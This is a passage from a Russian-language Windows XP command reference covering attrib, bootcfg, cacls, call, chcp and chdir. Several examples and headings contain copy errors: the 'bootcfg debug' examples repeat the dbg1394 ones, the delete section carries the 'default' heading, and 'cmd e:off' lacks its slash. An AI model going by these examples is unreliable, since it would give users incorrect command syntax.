    Число звонков, прерванных локальным абонентом = 1323
    Послано сигнальных и ILMI-пакетов = 33655
    Получено сигнальных и ILMI-пакетов = 34989

В следующей таблице содержится описание каждого элемента из приведенного вывода команды atmadm /s.
Статистика диспетчера вызовов     Описание
Текущие активные звонки     Активные вызовы ATM-адаптера, установленного на компьютере.
Общее число успешных входных звонков     Успешно полученные вызовы в сети с асинхронной передачей.
Общее число успешных выходных звонков     Вызовы с данного компьютера, успешно выполненные на других ATM-устройствах в сети.
Число сбоев входных звонков     Входящие вызовы, которым не удалось подключиться к компьютеру.
Число сбоев выходных звонков     Исходящие вызовы, которым не удалось подключиться к другому устройству в сети.
Число звонков, прерванных удаленным абонентом     Звонки, прерванные удаленным устройством в сети.
Число звонков, прерванных локальным абонентом     Звонки, прерванные компьютером.
Послано сигнальных и ILMI-пакетов     Количество пакетов интегрированного интерфейса локального управления (ILMI), отправленных коммутатору, к которому компьютер пытается подключиться.
Получено сигнальных и ILMI-пакетов     Количество пакетов ILMI, полученных от коммутатора.
========================================================================================
Attrib

Позволяет просматривать, устанавливать или снимать атрибуты файла или каталога, такие как «Только чтение», «Архивный», «Системный» и «Скрытый». Выполненная без параметров команда attrib выводит атрибуты всех файлов в текущем каталоге.
Синтаксис

attrib [{+r|-r}] [{+a|-a}] [{+s|-s}] [{+h|-h}] [[диск:][путь] имя_файла] [/s[/d]]
Параметры

+r
    Установка атрибута «Только чтение».
-r
    Снятие атрибута «Только чтение».
+a
    Установка атрибута «Архивный».
-a
    Снятие атрибута «Архивный».
+s
    Установка атрибута «Системный».
-s
    Снятие атрибута «Системный».
+h
    Установка атрибута «Скрытый».
-h
    Снятие атрибута «Скрытый».
[диск:][путь] имя_файла
    Задание местонахождения и имени каталога, файла или набора файлов, атрибуты которых требуется просмотреть или изменить. Для обработки группы файлов допускается применение подстановочных знаков (? и *) в параметре имя_файла.
/s
    Выполнение команды attrib и всех параметров командной строки для соответствующих файлов в текущем каталоге и всех его подкаталогах.
/d
    Выполнение команды attrib и всех параметров командной строки для каталогов.
/?
    Отображение справки в командной строке.

Заметки
- Работа с группами файлов

Для просмотра или изменения атрибутов группы файлов можно воспользоваться подстановочными знаками (? и *) в параметре имя_файла. Для изменения атрибутов системных или скрытых файлов вначале требуется снять соответствующие атрибуты.
- Использование атрибута «Архивный»

Атрибут «Архивный» (т. е. параметр +a) используется для отметки файлов, измененных со времени последнего резервного копирования. Этот атрибут используется в команде xcopy. Для получения дополнительных сведений об атрибуте «Архивный» и команде xcopy щелкните ссылку "".
- Команда attrib с другими параметрами доступна в консоли восстановления.
Примеры

Чтобы вывести атрибуты файла News86, расположенного в текущем каталоге, введите следующую команду:

attrib news86

Чтобы назначить атрибут «Только чтение» файлу Report.txt, введите следующую команду:

attrib +r report.txt

Чтобы снять атрибут "Только чтение" с файлов в каталоге \Public\Jones на диске B и всех его подкаталогах, введите следующую команду:

attrib -r b:\public\jones\*.* /s

Предположим, что необходимо передать коллеге диск, содержащий файлы из текущего каталога диска A, за исключением файлов с расширением .bak. Поскольку для копирования файлов с установленным атрибутом «Архивный» может быть использована команда xcopy, необходимо установить этот атрибут для всех файлов, подлежащих копированию. Вначале установите атрибут «Архивный» для всех файлов на диске A, а затем снимите этот атрибут для файлов с расширением .bak. Например, введите следующую команду:

attrib +a a:*.* attrib -a a:*.bak

Теперь для копирования файлов с диска A на диск B воспользуйтесь командой xcopy. Запущенная с параметром /a команда xcopy скопирует только файлы с установленным атрибутом «Архивный». Например, введите следующую команду:

xcopy a: b: /a

Если требуется снять атрибут Архивный со скопированных файлов, воспользуетесь командой xcopy с параметром /m вместо /a. Например, введите следующую команду:

xcopy a: b: /m
========================================================================================
Bootcfg

Настройка, запрос или изменение параметров файла Boot.ini.

bootcfg addsw

Добавление параметров загрузки операционной системы для определенной записи операционной системы.
Синтаксис

bootcfg /addsw [/s компьютер [/u домен\пользователь /p пароль]] [/mm максимальный_объем_ОЗУ] [/bv] [/so] [/ng] /id номер_строки_записи_в_разделе_ОС
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/mm максимальный_объем_ОЗУ
    Добавление ключа /maxmem в строку, указанную в параметре номер_строки_записи_в_разделе_ОС, и задание максимального объема ОЗУ, доступного операционной системе.
/bv
    Добавление ключа /basevideo в строку, указанную в параметре номер_строки_записи_в_разделе_ОС, который задает в операционной системе стандартный режим VGA для установленного видеодрайвера.
/so
    Добавление ключа /sos в строку, указанную в параметре номер_строки_записи_в_разделе_ОС, который задает в операционной системе вывод имен драйверов устройств при их загрузке.
/ng
    Добавление ключа /noguiboot в строку, указанную в параметре номер_строки_записи_в_разделе_ОС, который отключает индикатор выполнения Windows XP Professional, отображающийся перед приглашением на вход в систему нажатием клавиш CTRL+ALT+DEL.
/id номер_строки_записи_в_разделе_ОС
    Указание номера строки записи операционной системы в разделе [operating systems] файла Boot.ini, в которую добавляются параметры загрузки операционной системы. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /addsw.

bootcfg /addsw /mm 64 /id 2
bootcfg /addsw /so /id 3
bootcfg /addsw /so /ng /s srvmain /u hiropln /id 2
bootcfg /addsw /ng /id 2
bootcfg /addsw /mm 96 /ng /s srvmain /u maindom\hiropln /p p@ssW23 /id 2

bootcfg copy

Создание с помощью копирования другого экземпляра операционной системы, для которого можно добавить ключи.
Синтаксис

bootcfg /copy [/s компьютер [/u домен\пользователь /p пароль]] [/d описание] [/id номер_строки_записи_в_разделе_ОС]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u Domain\User
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/d описание
    Задает описание для новой записи операционной системы. 
/id номер_строки_записи_в_разделе_ОС
    Указание номера строки записи операционной системы в разделе [operating systems] файла Boot.ini для копирования. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /copy.

bootcfg /copy /d "\ABC Server\" /id 1
bootcfg /copy /s srvmain /u maindom\hiropln /p p@ssW23 /d "Windows XP" /id 2
bootcfg /copy /u hiropln /p p@ssW23 /d "AB Ver 1.001" /id 2

bootcfg dbg1394

Настройка отладки порта 1394 для определенной записи операционной системы.
Синтаксис

bootcfg /dbg1394 {ON|OFF|EDIT} [/s компьютер [/u домен\пользователь /p пароль]] [/ch канал] /id номер_строки_записи_в_разделе_ОС
Параметры

ON|OFF|EDIT
    Указание значения для отладки порта 1394.
    Значение     Описание
    ON     Включение поддержки удаленной отладки путем добавления ключа /dbg1394 в строку, указанную в параметре номер_строки_записи_в_разделе_ОС.
    OFF     Отключение поддержки удаленной отладки путем удаления ключа /dbg1394 из строки, указанной в параметре номер_строки_записи_в_разделе_ОС.
    EDIT     Разрешение вносить изменения в настроки порта и скорости путем изменения значений канала, связанных с ключом /dbg1394, для указанного параметра номер_строки_записи_в_разделе_ОС.
/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/ch канал
    Указание канала, используемого для отладки. Допустимыми значениями являются целые числа в диапазоне от 1 до 64. Если отладка порта 1394 отключена, не используйте параметр /ch канал.
/id номер_строки_записи_в_разделе_ОС
    Указание номера строки записи операционной системы в разделе [operating systems] файла Boot.ini, в которую добавляются параметры отладки порта 1394. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /dbg1394.

bootcfg /dbg1394 /id 2
bootcfg /dbg1394 on /ch 1 /id 3
bootcfg /dbg1394 edit /ch 8 /id 2
bootcfg /s srvmain /u maindom\hiropln /p p@ssW23 /dbg1394 off /id 2

bootcfg debug

Добавление или изменение параметров отладки для определенной записи операционной системы.
Синтаксис

bootcfg /debug {ON|OFF|EDIT} [/s компьютер [/u домен\пользователь /p пароль]] [/port {COM1|COM2|COM3|COM4}] [/baud {9600|19200|38400|57600|115200}] [/id номер_строки_записи_в_разделе_ОС]
Параметры

ON|OFF|EDIT
    Указывает значение для отладки.
Значение Описание
         Включение поддержки удаленной отладки путем добавления
ON       ключа /debug в строку, указанную в параметре
         номер_строки_записи_в_разделе_ОС.
         Отключение поддержки удаленной отладки путем удаления
OFF      ключа /debug из строки, указанной в параметре
         номер_строки_записи_в_разделе_ОС.
         Разрешение вносить изменения в настройки порта и скорости
EDIT     путем изменения значений, связанных с ключом /debug, для
         указанного параметра номер_строки_записи_в_разделе_ОС.
/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/port {COM1|COM2|COM3|COM4}
    Последовательный порт, используемый для отладки. Если отладка отключена, не используйте параметр /port.
/baud {9600|19200|38400|57600|115200}
    Скорость передачи, используемая для отладки. Если отладка отключена, не используйте параметр /baud.
/id номер_строки_записи_в_разделе_ОС
    Указывает номер строки записи операционной системы в разделе [operating systems] файла Boot.ini, в которую добавляются параметры отладки. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Заметки
- Если необходима отладка порта 1394, используйте команду bootcfg /dbg1394.
Примеры

Следующие примеры иллюстрируют использование команды bootcfg /debug.

bootcfg /dbg1394 /id 2
bootcfg /dbg1394 on /ch 19200 /id 3
bootcfg /dbg1394 edit /ch 8 /id 2
bootcfg /s srvmain /u maindom\hiropln /p p@ssW23 /dbg1394 off /id 2

bootcfg default

Задает запись операционной системы, используемую по умолчанию.
Синтаксис

bootcfg /default [/s компьютер [/u домен\пользователь /p пароль]] [/id номер_строки_записи_в_разделе_ОС]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/id номер_строки_записи_в_разделе_ОС
    Указывает номер строки записи операционной системы в разделе [operating systems] файла Boot.ini, используемую по умолчанию. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /default.

bootcfg /default /id 2
bootcfg /default /s srvmain /u maindom\hiropln /p p@ssW23 /id 2

bootcfg default

Удаление записи операционной системы в разделе [operating systems] файла Boot.ini.
Синтаксис

bootcfg /delete [/s компьютер [/u домен\пользователь /p пароль]] [/id номер_строки_записи_в_разделе_ОС]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/id номер_строки_записи_в_разделе_ОС
    Указывает номер строки записи операционной системы в разделе [operating systems] файла Boot.ini для удаления. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /delete.

bootcfg /delete /id 1
bootcfg /delete /s srvmain /u maindom\hiropln /p p@ssW23 /id 3

bootcfg ems

Позволяет пользователю добавлять или изменять параметры для перенаправления консоли EMS на удаленный компьютер. При использовании EMS в заголовок [boot loader] файла Boot.ini добавляется строка "redirect=Port#", а в указанную строку записи операционной системы — ключ /redirect. Функция EMS доступна только на серверах.
Синтаксис

bootcfg /ems {ON|OFF|EDIT} [/s компьютер [/u домен\пользователь /p пароль]] [/port {COM1|COM2|COM3|COM4|BIOSSET}] [/baud {9600|19200|38400|57600|115200}] [/id номер_строки_записи_в_разделе_ОС]
Параметры

ON|OFF|EDIT
    Указывает значение для перенаправления EMS.
    Значение     Описание
    ON     Разрешает удаленный вывод для указанного параметра номер_строки_записи_в_разделе_ОС. Добавляет ключ /redirect в строку, указанную в параметре номер_строки_записи_в_разделе_ОС, и параметр redirect=comX в раздел [boot loader]. Значение comX задается параметром /port.
    OFF     Запрещает вывод на удаленном компьютере. Удаляет ключ /redirect из строки, указанной в параметре номер_строки_записи_в_разделе_ОС, и параметр redirect=comX из раздела [boot loader].
    EDIT     Позволяет изменять настройки порта путем изменения параметра redirect=comX в разделе [boot loader]. Восстанавливается значение comX, заданное параметром /port.
/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/port {COM1|COM2|COM3|COM4|BIOSSET}
    Последовательный порт, используемый для перенаправления. Параметр BIOSSET задает использование настроек BIOS при определении порта для перенаправления в EMS. Если удаленное управление выводом запрещено, не используйте параметр /port.
/baud {9600|19200|38400|57600|115200}
    Скорость передачи, используемая для перенаправления. Если удаленное управление выводом запрещено, не используйте параметр /baud.
/id номер_строки_записи_в_разделе_ОС
    Указывает номер строки записи операционной системы в разделе [operating systems] файла Boot.ini, в которую добавляется параметр EMS. Первая строка после заголовка раздела [operating systems] имеет номер 1. Данный параметр является обязательным, если значение EMS установлено в ON или OFF.
/?
    Отображение справки в командной строке.

Заметки
- Дополнительные сведения о службах аварийного управления (EMS) см. в центре справки и поддержки.
Примеры

Следующие примеры иллюстрируют использование команды bootcfg /ems.

bootcfg /ems on /port com1 /baud 19200 /id 2
bootcfg /ems on /port biosset /id 3
bootcfg /s srvmain /ems off /id 2
bootcfg /ems edit /port com2 /baud 115200
bootcfg /s srvmain /u maindom\hiropln /p p@ssW23 /ems off /id 2

bootcfg query

Запрос и отображение записей разделов [boot loader] и [operating systems] файла Boot.ini.
Синтаксис

bootcfg /query [/s компьютер [/u домен\пользователь /p пароль]]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/?
    Отображение справки в командной строке.

Заметки
- Следующий пример иллюстрирует вывод команды bootcfg /query.

Параметры загрузки
--------------------
timeout: 30
default: multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
Элементы списка загрузки
------------
Идентификатор загрузочной записи: 1
Понятное имя: "Microsoft Windows XP Professional"
Путь: multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
Параметры загрузки ОС: /fastdetect /debug /debugport=com1:

- В разделе «Параметры загрузки» вывода команды bootcfg query отображаются все записи из раздела [boot loader] файла Boot.ini.- В разделе «Элементы списка загрузки» вывода bootcfg query отображаются следующие сведения для каждой записи операционной системы в разделе [operating systems] файла Boot.ini: «Идентификатор загрузочной записи», «Понятное имя», «Путь» и «Параметры загрузки ОС».
Примеры

Следующие примеры иллюстрируют использование команды bootcfg /query.

bootcfg /query
bootcfg /query /s srvmain /u maindom\hiropln /p p@ssW23
bootcfg /query /u hiropln /p p@ssW23

bootcfg raw

Добавление параметров загрузки операционной системы, заданных в виде строки, в запись операционной системы в разделе [operating systems] файла Boot.ini.
Синтаксис

bootcfg [/s компьютер [/u домен\пользователь /p пароль]] /raw строка_параметров_загрузки_ОС [/id номер_строки_записи_в_разделе_ОС]
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
Строка_параметров_загрузки_ОС
    Параметры загрузки операционной системы, добавляемые в запись операционной системы. Эти параметры загрузки заменяют все существующие параметры загрузки, связанные с данной записью операционной системы. Проверка параметров_загрузки_ОС не выполняется.
/id номер_строки_записи_в_разделе_ОС
    Указывает номер строки записи операционной системы в разделе [operating systems] файла Boot.ini для обновления. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Заметки
- Команда Bootcfg raw используется для добавления текста в конец записи операционной системы, замещающего все существующие параметры записи операционной системы. Этот текст должен содержать допустимые параметры загрузки операционной системы, такие как /debug, /fastdetect, /nodebug, /baudrate, /crashdebug и /sos. Например, следующая команда добавляет параметры "/debug /fastdetect" в конец первой записи операционной системы, которые заменяют все ранее заданные параметры данной записи операционной системы:

bootcfg /raw "/debug /fastdetect" /id 1
- Дополнительные сведения о необязательных параметрах загрузки операционной системы и использовании файла Boot.ini при запуске Windows см. в статье Q170756, "Available Switch Options for Windows NT Boot.ini File" на веб-узле Microsoft Knowledge Base. (http://www.microsoft.com/)
Примеры

Следующие примеры иллюстрируют использование команды bootcfg /raw.

bootcfg /raw "/debug /sos" /id 2
bootcfg /raw /s srvmain /u maindom\hiropln /p p@ssW23 "/crashdebug " /id 2

bootcfg rmsw

Удаление параметров загрузки операционной системы из определенной записи операционной системы.
Синтаксис

bootcfg /rmsw [/s компьютер [/u домен\пользователь /p пароль]] [/mm] [/bv] [/so] [/ng] /id номер_строки_записи_в_разделе_ОС
Параметры

/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/mm
    Удаление ключа /maxmem и соответствующего значения максимального объема памяти из строки, указанной в параметре номер_строки_записи_в_разделе_ОС. Ключ /maxmem задает максимальный объем ОЗУ, доступный операционной системе.
/bv
    Удаление ключа /basevideo из строки, указанной в параметре номер_строки_записи_в_разделе_ОС. Ключ /basevideo задает использование стандартного режима VGA в операционной системе для установленного видеодрайвера.
/so
    Удаление ключа /sos из строки, указанной в параметре номер_строки_записи_в_разделе_ОС. Ключ /sos задает в операционной системе вывод имен драйверов устройств при их загрузке.
/ng
    Удаление ключа /noguiboot из строки, указанной в параметре номер_строки_записи_в_разделе_ОС. Ключ /noguiboot отключает индикатор выполнения Windows XP Professional, отображающийся перед приглашением на вход в систему нажатием клавиш CTRL+ALT+DEL.
/id номер_строки_записи_в_разделе_ОС
    Указывает номер строки записи операционной системы в разделе [operating systems] файла Boot.ini, из которой удаляются параметры загрузки операционной системы. Первая строка после заголовка раздела [operating systems] имеет номер 1.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /rmsw.

bootcfg /rmsw /mm 64 /id 2
bootcfg /rmsw /so /id 3
bootcfg /rmsw /so /ng /s srvmain /u hiropln /id 2
bootcfg /rmsw /ng /id 2
bootcfg /rmsw /mm 96 /ng /s srvmain /u maindom\hiropln /p p@ssW23 /id 2

bootcfg timeout

Изменение значения таймаута операционной системы.
Синтаксис

bootcfg /timeout значение_таймаут [/s компьютер [/u домен\пользователь /p пароль]]
Параметры

значение_таймаута
    Значение таймаута в разделе [boot loader]. Это время ожидания в секундах, в течение можно выбрать операционную системе в экране начальной загрузки, прежде чем стандартные парметры будут загружены программой NTLDR. Если задано знчение 0, программа NTLDR запускает используемую по умолчанию операционную систему сразу, без отображения экрана начальной загрузки.
/s компьютер
    Имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Пароль учетной записи пользователя, заданной параметром /u.
/?
    Отображение справки в командной строке.

Примеры

Следующие примеры иллюстрируют использование команды bootcfg /timeout.

bootcfg /timeout 30
bootcfg /s srvmain /u maindom\hiropln /p p@ssW23 /timeout 50
========================================================================================
Cacls

Просмотр или изменение файлов избирательных таблиц управления доступом (DACL).
Синтаксис

cacls имя_файла [/t] [/e] [/c] [/g пользователь:разрешение] [/r пользователь [...]] [/p пользователь:разрешение [...]] [/d пользователь [...]]
Параметры

имя_файла
    Обязательный параметр. Вывод избирательных таблиц управления доступом (DACL) указанных файлов. 
/t
    Изменение избирательных таблиц контроля доступа (DACL) указанных файлов в текущем каталоге и всех подкаталогах.
/e
    Редактирование избирательной таблицы управления доступом (DACL) вместо ее замены.
/c
    Продолжение внесения изменений в избирательные таблицы управления доступом (DACL) с игнорированием ошибок.
/g пользователь:разрешение
    Предоставление прав доступа указанному пользователю. В следующей таблице перечислены допустимые значения параметра разрешение.
Значение               Описание
n                      Нет
r                      Чтение
w                      Запись
c                      Изменение (запись)
f                      Полный доступ

/r пользователь
    Отмена прав доступа для указанного пользователя.
/p пользователь:разрешение
    Смена прав доступа для указанного пользователя. В следующей таблице перечислены допустимые значения параметра разрешение.
Значение               Описание
n                      Нет
r                      Чтение
w                      Запись
c                      Изменение (запись)
f                      Полный доступ
/d пользователь
    Запрещение доступа для указанного пользователя.
/?
    Отображение справки в командной строке.

Заметки
- Для расшифровки полученных результатов воспользуйтесь следующей таблицей.
Вывод           Применение таблицы управления доступом (ACE)
OI              Для этой папки и ее файлов
CI              Для этой папки и ее подпапок
IO              Таблица управления доступом (ACE) не применяется к
                текущему файлу/каталогу
Выходное сообщение Только для этой папки
отсутствует
(IO)(CI)           Для этой папки, ее подпапок и файлов
(OI)(CI)(IO)       Только для подпапок и файлов
(CI)(IO)           Только для подпапок
(OI)(IO)           Только для файлов
- Для задания нескольких файлов можно использовать подстановочные знаки (* и ?). 
- Имеется возможность указать несколько пользователей. 
========================================================================================
Call

Вызов одного пакетного файла из другого без завершения выполнения первого файла. Команда call принимает метки в качестве объекта вызова. Используемая в командной строке, а не в сценарии или пакетном файле, команда Call игнорируется.
Синтаксис

call [[диск:][путь] имя_файла [пакетные_параметры]] [:метка [аргументы]]
Параметры

[диск:][путь] имя_файла
    Задает имя и местоположение пакетного файла для запуска. Параметр имя_файла должен иметь расширение .bat или .cmd.
пакетные_параметры
    Задает данные командной строки, используемые программой пакетной обработки, включая параметры командной строки, имена файлов, пакетные параметры (в диапазоне от %0 до %9) или переменные (например %baud%).
:метка
    Указывает метку, на которую должно быть передано управление программы пакетной обработки. При использовании команды call с этим параметром создается новый контекст пакетного файла, а управление передается инструкции, следующей за указанной меткой. Когда первый раз встречается конец пакетного файла (после перехода на метку), управление возвращается на инструкцию, следующую за инструкцией call. При втором достижении конца файла выполнение пакетной программы прекращается. Для получения описания расширения goto :eof, которое позволяет возвращать управление из пакетной программы, щелкните ссылку «».
аргументы
    Задает данные командной строки, которые передаются в новый экземпляр программы пакетной обработки, начинающейся с :метки, включая параметры командной строки, имена файлов, пакетные параметры (в диапазоне от %1 до %9) или переменные (например %baud%).
/?
    Отображение справки в командной строке.

Заметки
- Использование пакетных параметров

Пакетные параметры могут содержать любые сведения, которые допускается передавать в программы пакетной обработки, включая параметры командной строки, имена файлов, пакетные параметры (в диапазоне от %0 до %9) или переменные (например %baud%). Для получения дополнительных сведений о пакетных параметрах щелкните ссылку «».
- Использование каналов и символов перенаправления

Каналы и символы перенаправления не допускается использовать с командой call.
- Рекурсивный вызов пакетных файлов

Создание пакетных файлов, которые вызывают сами себя, допускается, однако в этом случае необходимо задать условия выхода. В противном случае родительская и дочерняя программы будут вызывать друг друга в бесконечном цикле.
- Работа с расширениями командного процессора

Если расширения командного процессора разрешены (задано по умолчанию), команда call принимает метки в качестве объекта вызова. Правильный синтаксис:

call :аргументы метки

Для получения дополнительных сведений о разрешении и запрещении расширений командного процессора щелкните ссылку «» и см. команду cmd.
Примеры

Для вызова программы Checknew.bat из другого пакетного файла в тексте родительского пакетного файла введите следующую строку:

call checknew

Если родительская пакетная программа принимает два пакетных параметра и требуется передать их в файл Checknew.bat, включите следующую команду в родительскую пакетную программу:

call checknew %1 %2
========================================================================================
Chcp

Просмотр номера текущей кодовой страницы или изменение текущей кодовой страницы консоли. Выполненная без параметров команда chcp выводит номер текущей кодовой страницы для окна командной строки.
Синтаксис

chcp [код]
Параметры

код
    Задает номер кодовой страницы. Поддерживаемые кодовые таблицы с соответствующими странами/регионами или языками приведены в следующей таблице.
Кодовая страница     Страна/регион или язык
437     США
850     Многоязыковый (латиница I)
852     Восточная и центральная Европа (латиница II)
855     Кириллица (русский)
857     Турецкий
860     Португальский
861     Исландский
863     Французский (Канада)
865     Скандинавский
866     Русский
869     Современный греческий
/?
    Отображение справки в командной строке.

Заметки
- Только кодовая страница изготовителя вычислительной техники (ИВТ), установленная в системе Windows XP, отображается правильно в окне командной строки при использовании растрового шрифта. Прочие кодовые страницы будут правильно отображаться только в полноэкранном режиме или в окне командной строки, использующем шрифты TrueType. - Подготовка кодовых страниц, в отличие от MS-DOS, не требуется. - В программах, запущенных после назначения новой кодовой страницы, используется эта кодовая страница, а в программах, запущенных до назначения новой кодовой страницы, — исходная.
Примеры

Чтобы просмотреть номера текущей кодовой страницы, введите следующую команду:

chcp

Отобразится сообщение следующего вида:

Текущая кодовая страница: 437

Чтобы заменить текущую кодовую страницу страницей 850 (многоязычная латиница 1), введите следующую команду:

chcp 850

Если введено неверное значение номера кодовой страницы, на экран выводится следующее сообщение об ошибке:

Указана недопустимая кодовая страница
========================================================================================
Chdir (Cd)

Вывод имени текущего каталога или переход в другую папку. При использовании только с именем диска (например chdir C:) команда chdir выводит имена текущих диска и папки. Выполненная без параметров команда chdir выводит текущие диск и каталог.
Синтаксис

chdir [[/d] [диск:][путь] [..]] [[/d] [диск:][путь] [..]]

cd [[/d] [диск:][путь] [..]] [[/d] [диск:][путь] [..]]
Параметры

/d
    Смена текущего диска или текущего каталога на диске.
[диск:][путь]
    Задание имени диска (если он отличается от текущего) и каталога, в который требуется перейти.
[..]
    Переход в родительскую папку.
/?
    Отображение справки в командной строке.

Заметки
- Работа с расширениями командного процессора

Если расширения командного процессора разрешены (задано по умолчанию), имена папок в пути к текущему каталогу отображаются точно так же, как на жестком диске, в том же формате имен папок с учетом регистра. Например, если имя папки на жестком диске — C:\Temp, команда CD C:\TEMP задает текущий каталог C:\Temp, соответствующий формату имени этой папки на жестком диске.

Чтобы запретить расширения командного процессора для определенного процесса, введите следующую команду:

cmd e:off

Если расширения командного процессора запрещены, в команде chdir нельзя использовать пробелы в качестве разделителей. Таким образом, можно перейти в подкаталог, имя которого содержит пробел, не заключая параметр [путь] в кавычки. Например, следующий путь позволяет перейти в подкаталог \Start menu.

cd \winnt\profiles\username\programs\start menu

Для получения дополнительных сведений о разрешении и запрещении расширений командного процессора щелкните ссылку «» и см. раздел, посвященный команде cmd.
- Переход в корневой каталог

Корневой каталог является вершиной дерева каталогов на диске. Чтобы перейти в корневой каталог, введите следующую команду:

cd\
- Переход из основного каталога одного диска в основной каталог другого

Чтобы перейти в основной каталог диска отличного от текущего, введите следующую команду:

chdir [диск:\[каталог]]

cd [диск:\[каталог]]

Чтобы проверить переход к этому каталогу, введите одну из следующих команд:

chdir [диск:]

cd [диск:]
- Команда chdir с другими параметрами доступна в консоли восстановления.
Примеры

Используемая с именем диска команда chdir позволяет перейти в текущий каталог этого диска. Например, если ввести команду cd c: в приглашении каталога C:\Temp, отобразится следующая строка:

C:\Temp

Чтобы перейти в текущий каталог Reports, введите одну из следующих команд:

chdir \reports

cd \reports

Чтобы перейти из текущего каталога в подкаталог \Specials\Sponsors, введите следующую команду:

cd \specials\sponsors

Или, если текущим каталогом является \Specials, введите следующую команду, чтобы перейти в подкаталог \Specials\Sponsors:

cd sponsors

Чтобы перейти из подкаталога в родительский каталог, введите следующую команду:

cd ..

Для вывода на экран имени текущего каталога можно использовать команду chdir или cd без параметров. Например, если текущим каталогом является \Public\Jones на диске B, вызов команды chdir приведет к следующему результату:

B:\Public\Jones

Если при работе на диске D требуется скопировать все файлы каталогов \Public\Jones и \Public\Lewis на диске C в корневой каталог диска D, введите следующую последовательность команд:

chdir c:\public\jones

copy c:*.* d:\

chdir c:\public\lewis

copy c:*.* d:\

Если требуется скопировать все файлы каталогов \Public\Jones и \Public\Lewis в текущий каталог диска D, введите следующие команды:

chdir c:\public\jones

copy c:*.* d:

chdir c:\public\lewis

copy c:*.* d:
========================================================================================
Chkdsk

Вывод на экран отчета о состоянии диска в форме, зависящей от используемой файловой системы. Команда chkdsk также составляет список ошибок на диске и исправляет их. Выполненная без параметров команда chkdsk выводит информацию о состоянии текущего диска.
Синтаксис

